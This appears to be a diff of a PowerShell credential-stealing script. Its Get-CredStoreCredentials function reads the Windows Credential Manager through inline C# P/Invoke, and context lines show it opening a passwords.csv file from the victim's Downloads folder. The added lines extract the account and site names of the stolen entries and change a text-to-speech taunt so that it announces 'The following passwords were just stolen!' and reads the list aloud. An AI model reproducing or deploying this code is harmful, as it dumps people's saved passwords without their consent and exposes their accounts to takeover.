@@ -1,4 +1,3 @@
-
 Function Get-CredStoreCredentials {
 #region Pinvoke
 #region Inline C#
@@ -416,9 +415,20 @@ sleep 2
 cd $env:USERPROFILE\downloads
 .\passwords.csv
 
+$Resources=$AllPasswords.resource
+$StolenResources=@()
+foreach ($resource in $Resources){
+    If ($resource -like "*Target*"){$resource.Split(':')| Foreach {If ($_ -like "*@*" -or $_ -like "*\*"){$resource=$_}}}
+    If ($resource -like "*http*"){$resource=$resource.Trim('https://')}
+    If ($resource -like "www*"){$resource=$resource.Trim('www.')}
+    $StolenResources+=$resource
+    }
+
 Add-Type -AssemblyName System.speech
 $tts = New-Object System.Speech.Synthesis.SpeechSynthesizer
-$poem = @('
-Your passwords were just stolen!
-')
+$poem = @("
+The following passwords were just stolen!
+$StolenResources
+")
 $tts.Speak($poem)
+
